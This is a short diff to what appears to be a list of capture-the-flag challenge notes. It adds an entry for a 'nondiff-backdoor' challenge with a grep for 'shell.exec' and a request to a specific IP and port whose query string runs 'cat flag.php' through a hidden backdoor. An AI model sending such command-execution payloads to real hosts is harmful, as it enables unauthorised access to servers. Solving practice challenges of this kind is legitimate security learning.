@@ -19,6 +19,9 @@
 
 7 alfa-cookies- https://drive.google.com/file/d/1YjUzKJJnrR0L5DNr3H8GSDFRz73d6ekM/view
 
+8 nondiff-backdoor   grep -r "shell.exec"    34.159.62.179:30876/?welldone=knockknock&shazam=cat flag.php   
+
+
 
 
 
